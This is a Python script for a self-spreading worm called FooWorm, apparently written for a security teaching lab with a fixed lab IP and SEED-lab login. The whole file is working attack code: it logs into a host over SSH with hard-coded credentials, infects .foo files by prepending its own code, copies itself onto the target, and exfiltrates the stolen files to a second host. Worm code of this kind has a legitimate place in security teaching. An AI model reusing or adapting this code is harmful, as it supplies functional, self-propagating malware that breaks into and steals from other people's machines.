#!/usr/bin/env python
import sys
import os
import scp
import paramiko


print("\nHELLO FROM FooWorm!!\n")

while True:
    usernames = ["seed"]  # Specify username for the target host
    passwds = ["dees"]  # Specify password for the target host
    ipaddrs = ["10.0.2.22"]  # Specify the IP address of the target Host

    # First loop over passwords
    for passwd in passwds:
        # Then loop over user names
        for user in usernames:
            # And, finally, loop over randomly chosen IP addresses
            for ip_address in ipaddrs:
                print("\nTrying password %s for user %s at IP address: %s" % (passwd, user, ip_address))
                files_of_interest_at_target = []
                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(ip_address, port=22, username=user, password=passwd, timeout=5)
                    print("\n\nconnected\n")
                    # Let's make sure that the target host was not previously infected:
                    received_list = error = None
                    stdin, stdout, stderr = ssh.exec_command('ls')
                    error = stderr.readlines()
                    if error:
                        print(error)
                    received_list = [item.strip() for item in stdout.readlines()]
                    print("\n\noutput of 'ls' command: %s" % str(received_list))
                    if any('FooWorm' in item for item in received_list):
                        print("\nThe target machine is already infected\n")
                        continue
                    # Now let's look for files that have .foo extension
                    cmd = 'ls *.foo'
                    stdin, stdout, stderr = ssh.exec_command(cmd)
                    error = stderr.readlines()
                    if error:
                        print(error)
                        continue
                    received_list = [item.strip() for item in stdout.readlines()]
                    for item in received_list:
                        files_of_interest_at_target.append(item)
                    print("\nfiles of interest at the target: %s" % str(files_of_interest_at_target))
                    scpcon = scp.SCPClient(ssh.get_transport())
                    if files_of_interest_at_target:
                        for target_file in files_of_interest_at_target:
                            scpcon.get(target_file)
                            with open(sys.argv[0], 'r') as IN:
                                virus = [line for (i, line) in enumerate(IN) if i < 100]
                            with open(target_file, 'r') as TAR:
                                all_of_it = TAR.readlines()
                            if any('foovirus' in line for line in all_of_it):
                                continue
                            os.chmod(target_file, 0o777)  # Change mode to octal
                            with open(target_file, 'w') as OUT:
                                OUT.writelines(virus)
                                all_of_it = ['#' + line for line in all_of_it]
                                OUT.writelines(all_of_it)
                    # Now deposit a copy of FooWorm.py at the target host:
                    scpcon.put(sys.argv[0])
                    scpcon.close()
                except Exception as e:
                    print("Exception occurred:", e)
                    continue
                # Now upload the exfiltrated files to a specially designated host,
                # which can be a previously infected host.
                if files_of_interest_at_target:
                    print("\nWill now try to exfiltrate the files")
                    try:
                        ssh = paramiko.SSHClient()
                        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        # For exfiltration demo to work, you must provide an IP address and the login
                        # credentials in the next statement:
                        ssh.connect('10.0.2.22', port=22, username='seed', password='dees', timeout=5)
                        scpcon = scp.SCPClient(ssh.get_transport())
                        print("\nConnected to exfiltration host\n")
                        for filename in files_of_interest_at_target:
                            scpcon.put(filename)
                        scpcon.close()
                    except Exception as e:
                        print("Exception occurred during exfiltration:", e)
                        continue
    break
